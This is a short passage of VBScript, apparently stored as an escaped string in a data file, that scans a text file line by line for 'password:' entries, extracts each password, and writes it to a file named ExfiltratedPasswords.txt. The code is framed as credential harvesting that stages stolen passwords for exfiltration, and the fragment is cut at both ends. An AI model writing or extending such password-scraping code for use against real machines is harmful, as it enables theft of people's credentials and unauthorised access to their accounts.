  \            line = objTextFile.ReadLine\n            \n           'Check if the\
  \ line contains a password\n            If InStr(1, line, \"password:\", vbTextCompare)\
  \ > 0 Then\n               'Extract the password\n                password = Mid(line,\
  \ InStr(1, line, \"password:\", vbTextCompare) + 10)\n                password =\
  \ Left(password, InStr(password, \":\") - 1)\n                \n               'Write\
  \ the password to a new file\n                Set objTextFile2 = objFSO.CreateTextFile(\"\
  C:\\Path\\To\\ExfiltratedPasswords.txt\", True)\n                objTextFile2.WriteLine\
  \ password\n                objTextFile2.Close\n                \n             \
  \  'Set the flag to indicate a password was found\n                passwordFound\
  \ = True\n                \n            End If\n            \n           'Move to\
